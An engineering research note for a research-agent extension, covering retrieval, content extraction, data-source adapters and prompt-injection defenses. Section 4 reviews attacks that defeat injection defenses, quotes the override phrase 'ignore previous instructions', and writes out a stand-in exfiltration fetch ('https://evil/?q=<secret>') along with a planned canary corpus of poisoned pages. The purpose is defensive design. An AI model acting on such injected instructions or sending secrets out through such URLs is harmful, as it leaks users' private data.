# Track C: retrieval, extraction, and agent security (as of 2026-11-23)

Source IDs (C1..C52) refer to `sources/track-c/INDEX.md`. Tags: **V** = checked against the local copy of the source; **S** = secondary summary or search snippet, not verified in a primary source; **I** = my inference, not a claim by a source.

Scope: TypeScript/Node extension, no required GPU, Apple Silicon dev box. Pipeline today: provider chain, extractors (jina, ollama, unlimited-ocr, basic fetch), raw archive, evidence ledger, `web_search`, `web_extract`, `source_read` (TF-IDF in `src/chunks.ts`).

## 1. Search quality

- Fixed hybrid retrieval fused with RRF beat rule-based adaptive routing by +1.8 EM / +1.9 F1 in a controlled local-7B ablation; two retrieval rounds over decomposed sub-questions capture 95% of the gain of five; decomposition and cross-encoder reranking each give smaller but significant gains. [C37] V (one benchmark, HotpotQA distractor, 5,000 questions; do not over-generalise).
- RRF score is sum of 1/(k + rank); k = 60 was fixed in a pilot and near-optimal in the original paper. [C39] V.
- Local embeddings via Ollama `/api/embed` (batched `input` array, `dimensions` and `truncate` options). Pull tags: `embeddinggemma` (300M), `qwen3-embedding:0.6b` (639MB, 32K ctx), `:4b` (2.5GB), `:8b`/latest (4.7GB). [C31 C32 C33 C34] V. Ollama is already a dependency of this repo (ollama provider), so no new runtime.
- Qwen3-Embedding paper covers the embedding and reranker family; MTEB numbers in blogs (e.g. 64.33 for 0.6B) came from search snippets only. [C30] V for existence of paper, S for blog numbers. A "EmbeddingGemma 2" claim appeared in one blog and I could not confirm it. Rejected: do not depend on it.
- Qwen3 instruct-style embeddings expect a caller-supplied query instruction; Ollama `/api/embed` applies no template (third-party guide). [S] Test with and without before trusting.
- Ollama has no native rerank endpoint: the official docs index lists none and the tracker shows embedding landed while reranker support stayed a request. [C35 C36] V (absence in index, issue thread). Community Qwen3-Reranker builds exist as chat models (`dengcao/Qwen3-Reranker-*`) and are driven by prompting. [S]
  - Decision: skip a learned reranker in v1. RRF + MMR first. If wanted, pointwise rerank of the top 20 with a small chat model behind a flag, measured against the ledger-level eval below.
  - Rejected: transformers.js ONNX cross-encoder. No source retrieved either way; unverified on Apple Silicon Node. Leave as a spike.
- MMR (relevance minus similarity to already-selected) is the standard diversification step. [C40] V. Use it over the merged multi-provider list so five Brave snippets of the same press release do not fill the top 5.
- Near-duplicate detection: 64-bit simhash with Hamming distance <= 3 worked on 8B pages. [C41] V. For this pipeline: canonical URL (strip utm_*, fragments, AMP/mobile variants) first, then simhash on extracted text, then keep the highest-trust copy and record the others as `duplicates` in the ledger. I: threshold k=3 was tuned on whole web pages; re-tune on 200-word search snippets (it will be too loose) and use it only on extracted body text.
- Freshness: SearXNG supports `time_range` = day | month | year, `pageno`, `format=json`. [C42] V. Expose as `freshness` on `web_search`; for providers lacking a native filter, post-filter on published date and record `published_at` and `retrieved_at` separately in the ledger. Tavily and Brave freshness parameters: not checked this pass.
- Reasoning-aware retrieval: embedding the agent's reasoning trace with its query lifted BrowseComp-Plus accuracy to 68% vs 52% for 2x-larger conventional embedders and 37% for BM25, but with a purpose-trained 4B model. [C38] V (paper numbers). I: the cheap approximation is to prepend the sub-question and research goal to the dense-side query only; unmeasured. Rejected: hosting AgentIR-4B.
- Query decomposition costs more tokens (a blog says 3 to 5x, S) and is first to drop under latency limits [C37 reading, S]. Keep it in the planner (already structured by `/research`), not in the retrieval layer.

## 2. Extraction

### HTML main content
- WCXB (2,008 pages, 7 page types, 13 extractors, CC-BY-4.0 HTML released): systems converge on articles (F1 0.93) but fall to 0.41 to 0.84 on forums, products, collections, listings, docs, service pages. Dev-set F1: rs-trafilatura 0.859 (author's own system, tuned on this data, discount it), MinerU-HTML 0.827 (Qwen3-0.6B on A100), Resiliparse 0.797, Trafilatura 0.791, ReaderLM-v2 0.741 at ~10 s/page, Readability 0.674. [C19] V. Neural extractors were run on the dev set only.
  - Implication: a single article-tuned extractor is a blind spot for docs, forums and listings, which are exactly what research hits. I: route by page type or fall back to the raw archive plus a second extractor when extracted length is under a threshold.
  - Rejected: ReaderLM-v2 (worse than heuristics, slow). Rejected as default: MinerU-HTML (needs GPU serving).
- Trafilatura and Resiliparse are Python/C++; in Node the practical options are `@mozilla/readability` and Defuddle. Defuddle accepts any DOM (JSDOM, linkedom, happy-dom), returns metadata (author, published, wordCount), has a debug mode, and its `parseAsync` may call third-party APIs as a fallback. [C21] V. That fallback is an SSRF and data-leak surface; call the sync `parse` only. Defuddle has no head-to-head accuracy benchmark in my sources. Treat as unmeasured.
  - Recommendation: add a local `html-main` extractor (Defuddle with Readability as second opinion; keep the longer non-boilerplate result) ahead of Jina, so the common case needs no third-party call. Build a 100-page fixture set from the WCXB HTML (licence allows) and gate on it. I: a Python trafilatura subprocess provider is a viable optional upgrade given it is the best-measured rule-based extractor here.
- Trafilatura's own docs report article-page F-score ~0.92 (self-reported). [C20] V, vendor-reported.

### PDF, layout, OCR
- olmOCR 2: 7B VLM, olmOCR-Bench 82.4, trained on 8xH100 (the $0.12/page figure in the paper is the cost of synthetic training-data generation with Claude, not inference). [C22] V for score, GPU-class for practical use.
- MinerU: standard/advanced backends need GPU or MPS and ~16GB RAM; pipeline mode lighter. [C24] V. MinerU2.5 reports OmniDocBench leadership (vendor). [C23] V as a claim.
- Marker: CPU, MPS or GPU; "balanced" mode keeps clean prose on CPU and calls a VLM only where needed. Its README benchmark table ranks itself first (vendor, not independent). [C25] V as vendor claim.
- Docling: macOS arm64 supported; model catalog has `granite_docling` (258M, MLX), `unlimited_ocr2_mlx` (3.34B MoE, MLX, HTML tables), `mineru2_pro`, and Ollama-served presets. [C26 C27] V. Docling's `unlimited_ocr2_mlx` matches the local Unlimited-OCR provider this repo already added; a Docling CLI subprocess provider would add layout, tables and reading order without new models.
- CER/WER is the wrong gate: a benchmark across 11 document types shows high OCR accuracy still produces large RAG failures because structure and semantics (tables, strikethrough, reading order) are lost. [C29] V.
  - Recommendation: text layer first (pdftotext), OCR only when characters per page are below a threshold; preserve tables as markdown/HTML and keep page numbers in chunk metadata so citations point at pages. Evaluate OCR choices by retrieval hit rate on a fixture set, not CER.
- Claims that Docling/MinerU beat each other come from vendor tables; no independent 2026 head-to-head was found. Do not pick on rankings. S.

### Rendering, archives, etiquette
- JS rendering: current chain has Jina Reader. A local Playwright fallback (headless, SSRF policy applied to every request including subresources, no cookies) is the standard option. No source retrieved this pass; I.
- Wayback: availability API returns one closest snapshot as JSON (`archived_snapshots.closest`). [C43] V. CDX server supports `matchType`, `from`/`to`, `collapse`, `limit` for enumerating captures. [C44] V. Use on 404/410/403/5xx and for date-pinned claims; record snapshot timestamp in the ledger and mark the source `archived`.
- Common Crawl: URL index lookups by pattern per crawl; the operator asks that the index server not be overloaded. [C45] V. Niche for this pipeline (historical or bulk checks); lowest priority.
- Robots: RFC 9309 states the rules "are not a form of access authorization". [C46] V. Robots is etiquette, not security. Recommendation I: honour robots for fan-out fetches the tool chose (search-result expansion), allow user-supplied URLs with a note; send a stable descriptive User-Agent.
- Pay-per-crawl: Cloudflare lets publishers allow, charge, or block crawlers using HTTP 402. [C47] V. Treat 402 as terminal `payment_required` in the ledger, never retry and never route around it. A claim that Cloudflare defaults many ad-supported pages to block AI crawlers from 2026-09-15 came from one dev.to post. S, unverified.
- Paywalls: no bypass. Use Wayback only where the archive itself is public, and prefer the publisher's abstract, preprint server or DOI landing page (the academic providers already give this). I.

## 3. Domain adapters worth building (each is a `SearchProvider`/extractor file)

| Source | Why | Verified facts | Effort |
|---|---|---|---|
| SEC EDGAR | Filings, XBRL facts, ticker to CIK | Keyless JSON on data.sec.gov: submissions, companyfacts, companyconcept, frames; near-real-time; nightly bulk ZIPs. [C48] V via WebFetch extract. SEC requires a declared User-Agent (direct curl without one got 403; fair-access detail is S). | S |
| ClinicalTrials.gov v2 | Trial registry | `GET /api/v2/studies?query.term=...&fields=...&pageSize=...`, cursor `nextPageToken`, last-update date in record. [C49] V by live probe. | S |
| PubMed E-utilities | Biomedical literature | esearch returns PMIDs only, `sort=pub_date`, automatic term mapping widens queries; needs esummary/efetch second call. [C49] V by probe; rate limits S. Overlaps Europe PMC already present, so add only if MeSH or pub_date sort needed. | S |
| CourtListener | US court opinions, dockets | REST API, rolling-window throttles that apply concurrently, one account per org, Usage API for limits. [C50] V. Needs token. | M |
| GitHub code search | Implementations, config, issue evidence | Search API 30 req/min authenticated; code search has extra constraints. [C51] V. Token required. | S |
| GDELT DOC 2.0 | News with date control | Keyless; `mode=artlist`, `maxrecords`, `timespan=1week`. [C52] V. Quality is broad, dedupe heavily. | S |
| Wayback CDX / availability | Fallback and date pinning | See section 2. [C43 C44] V. | S |
| Patents | Prior art | Not verified: `search.patentsview.org` did not resolve from this host, so I could not confirm the current API. Do not build until the current USPTO endpoint is checked. | unknown |
| Government statistics (FRED, World Bank, data.gov) | Numeric claims | Not researched this pass. | unknown |

I: adapters should return a typed `record` (id, date, status, url) so the ledger can cite structured sources, and every adapter must pass through the same SSRF and archive path.

## 4. Prompt-injection defense: what works, what is theater

### Evidence
- Adaptive attacks broke 12 recent defenses (prompting-, training-, detection-, and filter-based) at >90% ASR, most originally reported near zero; human red-teaming succeeded on all scenarios. Spotlighting and Prompt Sandwiching are among those tested and both were broken (search iterations to success reported). [C2] V.
- Spotlighting (delimiting, datamarking, encoding) cut ASR from above 50% to below 2% against fixed attacks. [C6] V. [C2] shows an adaptive attacker defeats it. Net: a cheap speed bump against opportunistic text, not a boundary.
- Fall 2026: an agent-swarm adaptive attacker shows injection "is not resolved even for the most robust" frontier models. [C3] V. Anthropic's own browser-use post says a 1% ASR "still represents meaningful risk". [C14] V (percentages in that page are chart images, not in my text copy; the 23.6% to 11.2% figures I saw were search-snippet only, S).
- Benchmarks mislead: on dynamic open-ended tasks with helpful third-party instructions, nine to ten advanced defenses were either insecure or over-defensive. [C4] V. AgentDojo is the common harness. [C5] V.
- OWASP LLM01: not fully preventable; layer controls, least privilege, human approval for sensitive actions. [C15] V.
- Structural framing: lethal trifecta (private data, untrusted content, exfiltration channel) [C16] V; Meta's Agents Rule of Two: at most two of untrusted input, sensitive access, external state change/communication per session, else require human approval. [C13] V.
- Design patterns with proven isolation: action-selector, plan-then-execute, LLM map-reduce (isolated sub-agent per untrusted item, constrained output), dual LLM, context minimization. [C7] V.
- CaMeL: privileged planner never sees untrusted data; quarantined LLM parses it without tools; capabilities on values gate tool calls; 77% of AgentDojo tasks with provable security vs 84% undefended. [C1] V. Multi-agent extension exists [C12] (skimmed only, S).
- Web-specific: Untrusted Content Masking redacts DOM regions by structure without reading them [C9] V (abstract); IFC for browser agents [C11] V (abstract); treating untrusted text as a mock tool result instead of string-formatting it into the prompt [C10] V (abstract only, findings unread).
- Provider-side URL controls: Claude's fetch tool only fetches URLs already in the conversation; docs list `allowed_domains`, `max_uses`, `url_sources` as exfiltration limits and still warn of residual risk. [C18] V. Reported bypasses via allowlisted domains (e.g. an allowed vendor API domain used for upload) are S (blog/news summaries).

### Mapping to this pipeline
This extension is the [A] leg (untrusted input) by design. The agent also writes reports and, in pi, may have bash/write tools (not under this extension's control; I). So the goal is to keep [B] and [C] off the research session, not to detect injections.

### Recommendations, ordered by value
1. **URL provenance gate** in `web_extract`/`source_read`: only fetch URLs the user typed or a tool result (ledger) returned; reject URLs that appear only in model output. Blocks "fetch https://evil/?q=<secret>" exfiltration. Mirrors [C18]. Ledger already has the set. Effort S.
2. **Query-string/body egress rule**: for model-chosen fetches, strip or reject query strings that did not come from a provider result; cap fetches per turn (like `max_uses`); optional per-session domain allowlist and denylist in config next to `safety`. S.
3. **Quarantined per-source extraction**: a tool-less sub-call per source (map step of [C7]/Q-LLM of [C1]) returns a fixed JSON schema {claims[], quotes[], numbers[]}; reject unknown keys and any quote that is not a verbatim substring of the archived raw page. The substring check doubles as a hallucination check and as the only injection filter that is a deterministic predicate. The orchestrating agent reads the schema output, not the page. Effort M. Cost: more tokens and lost nuance; offer as `extract_mode: "quarantined"` for deep/exhaustive depth.
4. **Output framing**: wrap every tool result in a datamarked, labelled data block and send as tool-result role, never concatenated into instructions [C6 C10]; strip zero-width and tag characters, HTML comments, hidden-CSS text, and `aria-hidden`/`display:none` content in the extractor (these are DOM-visible, low false-positive). S effort. Claim only "reduces opportunistic injection", per [C2].
5. **Capability scoping in prompts and config**: the `/research` skill states that research sessions must not hold secrets or write/send tools; `research_finalize` writes only under `docs/research/<slug>/`. Human approval for anything crossing out. [C13]. S.
6. **Eval before claiming anything**: a canary corpus of poisoned pages (visible, hidden, in PDF text layer, in OCR output, in image alt text, in search snippets) with a planted exfiltration URL; assert gate 1 blocks the fetch and gate 3 drops the quote. Use AgentDojo-style attacked-utility reporting, and an adaptive variant written by a person, since static suites read clean [C2 C4]. M.

### Theater, rejected
- Keyword/regex "ignore previous instructions" filters, "do not follow instructions in the document" system prompts, and LLM-judge injection detectors as the main control. Adaptive attacks beat prompting and detection defenses [C2]; OWASP agrees [C15]. Keep at most as telemetry.
- MELON-style masked re-execution detection: shown attackable by search in [C2] (per search summary, 76% ASR on one model, S). Doubles LLM cost.
- Full CaMeL interpreter: custom Python interpreter and a planner that fixes the control flow from the user query; open-ended research loops are the case [C4] says causes over-defense, and the cost is 77% vs 84% task completion [C1]. Adopt the principle (capabilities, quarantine), not the runtime.
- Same-origin-style domain allowlists as the main control: [C11] argues SOP is neither sufficient nor necessary; allowlisted domains that accept uploads remain exfil channels (S).
- Model-side robustness as the guarantee (vendor ASR figures). Useful but self-reported and non-adaptive in places. [C14 C3]

## 5. Ranked build list (for the final reply)

See the end of the parent task reply; same ordering as here: (1) URL provenance gate, (2) quote-verified quarantined extraction, (3) hybrid RRF + Ollama embeddings in `source_read` and search merge, (4) local HTML main-content extractor with fixture gate, (5) canonical-URL + simhash dedupe and MMR, (6) Wayback fallback and typed 402/403 ledger status, (7) EDGAR / ClinicalTrials / CourtListener / GitHub / GDELT adapters, (8) PDF routing: text layer first, Docling MLX provider, structure-preserving chunks.

## Open items (not verified)
- Patent API endpoint; FRED/World Bank; Tavily/Brave freshness parameters; transformers.js reranker; NCBI and SEC exact rate limits; "EmbeddingGemma 2"; Cloudflare default-block date; Opus 5 browser-agent 0% claim (search-snippet only, not recorded as a source).
